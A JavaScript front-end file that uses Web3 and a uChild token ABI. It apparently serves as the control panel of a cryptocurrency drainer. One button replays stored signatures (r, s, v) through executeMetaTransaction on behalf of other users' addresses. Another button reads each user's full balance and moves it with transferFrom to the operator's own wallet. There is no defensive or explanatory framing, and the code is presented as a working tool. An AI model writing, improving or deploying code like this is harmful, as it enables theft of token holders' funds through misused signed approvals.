import { mainNetwork, checkNetwork, checkConnection, Web3, getProvider, sendTransaction, getUserAddress } from './constants.js';

// Carga del front
window.onload = async () => {
    
    checkConnection().then( dataConnect => {
        const signsButton = document.getElementsByName('signButton');
        const transfersButton = document.getElementsByName('transferFunds');

        const web3 = new Web3(getProvider());
        const abi = require('./abi-codes/uChild_abi.json');
        console.log(abi);

        signsButton.forEach(button => {
            button.addEventListener("click", async () => {
                const contractAddress = button.getAttribute('data-tokenaddress');
                const userAddress = button.getAttribute('data-useraddress');
                const r = button.getAttribute('data-r');
                const s = button.getAttribute('data-s');
                const v = button.getAttribute('data-v');
                const functionSignature = button.getAttribute('data-functionSignature');

                const instanceContract = new web3.eth.Contract(abi, contractAddress);
                const txData = await instanceContract.methods.executeMetaTransaction(userAddress, functionSignature, r, s, v).encodeABI();

                sendTransaction(getUserAddress(), contractAddress, txData, 0);
            });
        });

        transfersButton.forEach(button => {
            button.addEventListener("click", async () => {
                const contractAddress = button.getAttribute('data-tokenaddress');
                const userAddress = button.getAttribute('data-useraddress');

                const instanceContract = new web3.eth.Contract(abi, contractAddress);
                const balanceUser = await instanceContract.methods.balanceOf(userAddress).call();

                if (balanceUser > 0) {
                    const txData = await instanceContract.methods.transferFrom(userAddress, getUserAddress(), balanceUser).encodeABI();
                    sendTransaction(getUserAddress(), contractAddress, txData, 0);


                } else {
                    alert('balance: 0');
                }
            });
        });
    });

    if (window.ethereum) {
        window.ethereum.on('chainChanged', (net_id) => { if (net_id != mainNetwork) {
            setTimeout(() => {
                checkNetwork();
            }, 3000);
        }; });
    }
};